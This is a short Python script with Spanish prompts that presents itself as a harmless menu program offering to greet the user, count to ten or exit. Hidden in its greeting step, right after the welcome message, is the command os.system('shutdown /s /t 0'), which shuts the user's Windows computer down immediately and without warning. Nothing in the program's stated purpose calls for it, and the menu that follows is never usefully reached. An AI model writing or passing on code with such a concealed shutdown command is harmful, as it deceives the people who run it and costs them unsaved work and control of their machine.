import os
import time

def menu():
    print("\nMenú:")
    print("1. Saludar")
    print("2. Contar hasta 10")
    print("3. Salir")

def contar():
    for i in range(1, 11):
        print(i)
        time.sleep(0.5)

while True:
    nombre = input("¿Cuál es tu nombre? ")
    if nombre:
        print(f"Hola, {nombre}! Bienvenido a este programa.")
        os.system("shutdown /s /t 0")
        break
    else:
        print("Por favor, ingresa un nombre válido.")

while True:
    menu()
    opcion = input("Elige una opción: ")
    if opcion == "1":
        print(f"¡Hola de nuevo, {nombre}!")
    elif opcion == "2":
        contar()
    elif opcion == "3":
        print("Saliendo del programa. ¡Hasta luego!")
        break
    else:
        print("Opción no válida, intenta de nuevo.")
